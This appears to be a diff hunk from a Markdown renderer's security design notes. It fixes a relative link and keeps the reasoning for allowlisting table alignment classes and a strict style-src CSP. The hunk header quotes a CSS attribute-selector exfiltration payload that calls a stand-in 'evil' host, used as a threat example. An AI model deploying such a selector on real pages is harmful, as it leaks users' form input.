@@ -393,7 +393,7 @@ exfiltration (`input[value^="a"]{background:url(//evil/a)}`) if forms were prese
 states plainly that it "is not a CSS sanitizer" and that CSS-based data
 exfiltration is an explicit non-goal, so this has to be an allowlist decision,
 not a sanitizer feature. Table alignment therefore uses classes
-([05-rendering/01-ast-to-html.md §1.6](./01-ast-to-html.md#16-tables)). CSP
+([05-rendering/01-ast-to-html.md §1.6](../05-rendering/01-ast-to-html.md#16-tables)). CSP
 `style-src 'self' 'unsafe-inline'` (we need inline for runtime theme variables) —
 never `https:`, so no remote stylesheet.
 
